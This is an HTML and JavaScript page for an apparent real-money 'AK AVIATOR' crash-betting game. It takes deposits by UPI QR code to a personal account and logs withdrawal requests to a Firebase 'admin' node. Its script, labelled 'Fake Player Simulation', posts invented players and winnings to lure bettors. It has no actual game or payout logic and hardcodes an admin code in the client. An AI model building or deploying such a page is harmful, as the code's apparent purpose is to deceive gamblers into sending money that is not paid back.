<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AK AVIATOR | Pro</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --red: #e91a3d; --bg: #0b0b0d; --card: #1c1c1e; --gold: #fbc02d; --green: #28a745; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Roboto', sans-serif; overflow-x: hidden; }
        
        .header { background: #121212; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--red); }
        .game-title { font-size: 20px; font-weight: 900; color: var(--red); cursor: pointer; }
        .wallet { background: #000; padding: 5px 12px; border-radius: 20px; border: 1px solid #333; font-weight: bold; color: var(--green); }

        .top-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; padding: 10px; }
        .top-btn { padding: 8px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; color: white; font-size: 12px; }

        .game-area { height: 220px; background: radial-gradient(circle, #250101 0%, #000000 100%); position: relative; overflow: hidden; }
        #multiplier { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); font-size: 50px; font-weight: 900; z-index: 10; }
        #plane { position: absolute; bottom: 20px; left: 20px; width: 55px; z-index: 5; transition: transform 0.1s linear; }
        
        .player-list { height: 180px; overflow-y: hidden; padding: 0 10px; margin-bottom: 120px; }
        .player-item { display: flex; justify-content: space-between; padding: 8px 0; font-size: 12px; border-bottom: 1px solid #151515; }

        .bet-box { background: var(--card); padding: 15px; border-radius: 20px 20px 0 0; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; z-index: 100; }
        .input-row { display: flex; gap: 10px; margin-bottom: 10px; }
        input { background: #000; border: 1px solid #444; color: white; padding: 12px; border-radius: 10px; width: 40%; font-size: 18px; text-align: center; outline: none; }
        .bet-btn { flex-grow: 1; border-radius: 10px; border: none; font-size: 18px; font-weight: bold; color: white; background: var(--green); }

        /* Modals */
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1000; align-items:center; justify-content:center; }
        .modal-content { background: #1c1c1e; width: 85%; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #333; }
        .modal input { width: 100%; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="header">
    <div class="game-title" id="titleBtn">AK AVIATOR</div>
    <div class="wallet" id="userBal">₹0.00</div>
</div>

<div class="top-btns">
    <button class="top-btn" style="background:var(--green)" onclick="openM('depM')">DEPOSIT</button>
    <button class="top-btn" style="background:#444" onclick="openM('withM')">WITHDRAW</button>
</div>

<div class="game-area">
    <div id="multiplier">1.00x</div>
    <img src="https://img.icons8.com/color/96/fighter-jet.png" id="plane">
</div>

<div class="player-list" id="fakePlayers"></div>

<div class="bet-box">
    <div class="input-row">
        <input type="number" id="betAmt" value="100">
        <button id="mainBtn" class="bet-btn">BET</button>
    </div>
</div>

<div id="depM" class="modal"><div class="modal-content">
    <h3>Deposit</h3>
    <p style="font-size:12px; color:#888">UPI ID: Poonamlondhe52-1@okhdfcbank</p>
    <input type="number" id="depAmount" placeholder="Amount" oninput="genQR()">
    <div id="qrArea" style="display:none;">
        <img id="qrImg" src="" width="180" style="background:white; padding:10px; border-radius:10px; margin-bottom:10px;">
        <input type="text" id="utr" placeholder="Enter 12-digit UTR">
        <button class="top-btn" style="background:var(--green); width:100%" onclick="submitDep()">SUBMIT</button>
    </div>
    <button class="top-btn" style="background:#333; width:100%; margin-top:10px" onclick="closeM('depM')">Close</button>
</div></div>

<div id="withM" class="modal"><div class="modal-content">
    <h3 style="color:var(--gold)">Withdraw Money</h3>
    <p style="font-size:11px; color:#777; margin-bottom:15px;">Min: ₹500 | Max: ₹50,000</p>
    
    <input type="number" id="withAmount" placeholder="Enter Amount (₹)">
    <input type="text" id="withUpi" placeholder="Enter Your UPI ID (e.g. name@upi)">
    
    <button class="bet-btn" style="width:100%; padding:12px;" onclick="submitWithdraw()">Request Withdrawal</button>
    
    <div style="text-align:left; font-size:10px; color:#666; margin-top:15px;">
        * Payments are processed within 2-24 hours.<br>
        * Ensure UPI ID is correct.
    </div>
    <button class="top-btn" style="background:#333; width:100%; margin-top:15px" onclick="closeM('withM')">Cancel</button>
</div></div>

<script>
    const firebaseConfig = { databaseURL: "https://my-colour-game-670af-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let uid = localStorage.getItem('AX_UID') || 'U'+Math.floor(Math.random()*9999);
    localStorage.setItem('AX_UID', uid);

    // Withdrawal Logic
    function submitWithdraw() {
        let amt = document.getElementById('withAmount').value;
        let upi = document.getElementById('withUpi').value;
        
        if(amt < 500) return alert("Minimum withdrawal is ₹500");
        if(upi.length < 5 || !upi.includes('@')) return alert("Enter a valid UPI ID");

        // Send to Admin Panel
        db.ref('admin/withdrawRequests').push({
            uid: uid,
            amount: amt,
            upiId: upi,
            status: 'pending',
            timestamp: Date.now()
        }).then(() => {
            alert("Withdrawal request sent to admin!");
            closeM('withM');
        });
    }

    // Existing Functions
    function genQR() {
        let amt = document.getElementById('depAmount').value;
        if(amt > 0) {
            document.getElementById('qrArea').style.display = 'block';
            let upi = `upi://pay?pa=Poonamlondhe52-1@okhdfcbank&pn=AK%20AVIATOR&am=${amt}&cu=INR`;
            document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upi)}`;
        }
    }

    function openM(id) { document.getElementById(id).style.display='flex'; }
    function closeM(id) { document.getElementById(id).style.display='none'; }
    
    // Fake Player Simulation
    setInterval(() => {
        const list = document.getElementById('fakePlayers');
        const names = ["Aman", "Priya", "Rahul", "Sonia", "Imran"];
        const n = names[Math.floor(Math.random()*names.length)];
        const b = (Math.random()*500 + 100).toFixed(0);
        list.innerHTML = `<div class="player-item"><span>${n}</span><span>₹${b}</span><span style="color:var(--green)">+₹${(b*1.5).toFixed(0)}</span></div>` + list.innerHTML;
        if(list.children.length > 8) list.removeChild(list.lastChild);
    }, 2500);

    // Admin Panel Entry
    let taps = 0;
    document.getElementById('titleBtn').onclick = () => {
        taps++; if(taps === 5 && prompt("Admin Code:") === "77759636477") alert("Admin: New requests available in Firebase!");
    };
</script>
</body>
</html>
